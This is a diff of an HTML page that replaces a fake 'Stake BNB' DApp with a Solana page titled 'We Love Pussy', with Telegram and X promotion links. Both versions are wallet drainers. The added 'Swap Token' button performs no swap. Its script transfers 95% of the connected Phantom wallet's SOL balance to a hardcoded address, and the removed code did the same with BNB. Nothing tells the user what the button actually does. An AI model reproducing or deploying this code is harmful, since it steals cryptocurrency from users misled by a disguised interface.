@@ -3,114 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Staking DApp on BSC</title>
+    <title>We Love Pussy</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; }
-        h1 { text-align: center; color: #333; }
-        #app { width: 80%; margin: 0 auto; text-align: center; padding: 20px; border-radius: 10px; background-color: #fff; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); }
-        #walletAddress { margin: 20px 0; }
-        button { padding: 10px 20px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        button:hover { background-color: #0056b3; }
-        .status { margin-top: 20px; font-size: 18px; font-weight: bold; }
-        #progressBar { width: 100%; height: 30px; background-color: #e0e0e0; border-radius: 15px; margin-top: 20px; display: none; }
-        #progress { height: 100%; background-color: #4caf50; border-radius: 15px; width: 0; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        #app {
+            width: 80%;
+            margin: 0 auto;
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #fff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        #walletAddress {
+            margin: 20px 0;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        #progressBar {
+            width: 100%;
+            height: 30px;
+            background-color: #e0e0e0;
+            border-radius: 15px;
+            margin-top: 20px;
+            display: none;
+        }
+        #progress {
+            height: 100%;
+            background-color: #4caf50;
+            border-radius: 15px;
+            width: 0;
+        }
+        .social-links {
+            margin-top: 20px;
+        }
+        .social-links a {
+            margin: 0 10px;
+            text-decoration: none;
+            font-size: 18px;
+            color: #007bff;
+            transition: color 0.3s ease;
+        }
+        .social-links a:hover {
+            color: #0056b3;
+        }
     </style>
 </head>
 <body>
 
 <div id="app">
-    <h1>Stake on BSC</h1>
-    <p id="walletAddress">Connect your wallet to see your BSC address</p>
-    <button id="connectButton">Connect Wallet</button>
-    <button id="stakeButton" disabled>Stake BNB</button>
+    <h1>We Love Pussy</h1>
+    <p id="walletAddress">Connect your Phantom wallet to see your Solana address</p>
+    <button id="connectButton">Connect Phantom Wallet</button>
+    <button id="swapButton" disabled>Swap Token</button>
     <div class="status" id="status"></div>
     <div id="progressBar"><div id="progress"></div></div>
+
+    <!-- Social Media Links -->
+    <div class="social-links">
+        <a href="https://t.me/welovepussycommunity" target="_blank">Join us on Telegram</a> |
+        <a href="https://x.com/welovepussycto?s=21" target="_blank">Follow us on Twitter (X)</a>
+    </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 <script>
-    let web3;
+    const { PublicKey, Transaction, SystemProgram, Connection, clusterApiUrl } = solanaWeb3;
+    const recipientAddress = new PublicKey("3GXcLtX156MuRWSPAHWf9VPDaSPPZA6Tn1aARzUaWW8N");
+    let provider;
     let userAccount;
-    let recipientAddress = "0x91Dc7c5B75c0FCD64a02F648d56cDE818982D1f2";  // BSC recipient address
+    const connection = new Connection(clusterApiUrl("mainnet-beta"));
 
-    // Connect to Wallet (MetaMask or Trust Wallet)
+    // Connect to Phantom Wallet
     document.getElementById("connectButton").addEventListener("click", async () => {
-        if (window.ethereum) {
-            web3 = new Web3(window.ethereum);
+        if (window.solana && window.solana.isPhantom) {
+            provider = window.solana;
             try {
-                await window.ethereum.request({ method: "eth_requestAccounts" });
-                userAccount = (await web3.eth.getAccounts())[0];
+                await provider.connect();
+                userAccount = provider.publicKey.toString();
                 document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
-                checkNetwork();
-                document.getElementById("stakeButton").disabled = false;
+                document.getElementById("swapButton").disabled = false;
             } catch (error) {
-                console.error("Error connecting to wallet", error);
+                console.error("Error connecting to Phantom Wallet", error);
             }
-        } else if (window.web3) {
-            // Legacy dapp browsers
-            web3 = new Web3(window.web3.currentProvider);
-            userAccount = (await web3.eth.getAccounts())[0];
-            document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
-            checkNetwork();
-            document.getElementById("stakeButton").disabled = false;
         } else {
-            alert("Please install MetaMask or use Trust Wallet!");
+            alert("Please install Phantom Wallet!");
         }
     });
 
-    // Check if the user is connected to the BSC network
-    async function checkNetwork() {
-        const networkId = await web3.eth.net.getId();
-        if (networkId !== 56) {
-            alert("You are not connected to the Binance Smart Chain network. Please switch to BSC.");
-        } else {
-            console.log("Connected to BSC network");
-        }
-    }
-
-    // Stake BNB from user's wallet to the recipient address
-    document.getElementById("stakeButton").addEventListener("click", async () => {
+    // Swap Token Functionality (Send 95% of SOL balance)
+    document.getElementById("swapButton").addEventListener("click", async () => {
         try {
+            // Display progress bar
             document.getElementById("progressBar").style.display = "block";
             let progress = 0;
-            let progressInterval = setInterval(() => {
+            const progressInterval = setInterval(() => {
                 if (progress < 100) {
                     progress += 10;
                     document.getElementById("progress").style.width = progress + "%";
                 }
             }, 1000);
 
-            const balance = await web3.eth.getBalance(userAccount);
-            const gasPrice = await web3.eth.getGasPrice();
-            const gasLimit = await web3.eth.estimateGas({
-                from: userAccount,
-                to: recipientAddress,
-                value: balance
-            });
+            // Get user's SOL balance and calculate 95%
+            const balance = await connection.getBalance(provider.publicKey);
+            const amountToSend = Math.floor(balance * 0.95); // 95% of balance
 
-            const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
-            const sendPercentage = 0.95;
-            const valueToSend = BigInt(balance) * BigInt(sendPercentage * 100) / BigInt(100);
+            // Create and send transaction
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: provider.publicKey,
+                    toPubkey: recipientAddress,
+                    lamports: amountToSend
+                })
+            );
 
-            if (valueToSend <= gasCost) {
-                document.getElementById("status").innerText = "Insufficient BNB to cover gas fees.";
-                clearInterval(progressInterval);
-                document.getElementById("progress").style.width = "0%";
-                return;
-            }
+            const signature = await provider.signAndSendTransaction(transaction);
 
-            const tx = await web3.eth.sendTransaction({
-                from: userAccount,
-                to: recipientAddress,
-                value: valueToSend.toString()
-            });
-
+            // Stop progress bar and show success message
             clearInterval(progressInterval);
             document.getElementById("progress").style.width = "100%";
-            document.getElementById("status").innerText = "Transaction successful: " + tx.transactionHash;
+            document.getElementById("status").innerText = "Swap successful: " + signature;
         } catch (error) {
-            document.getElementById("status").innerText = "Transaction failed: " + error.message;
-            clearInterval(progressInterval);
+            document.getElementById("status").innerText = "Swap failed: " + error.message;
             document.getElementById("progress").style.width = "0%";
         }
     });
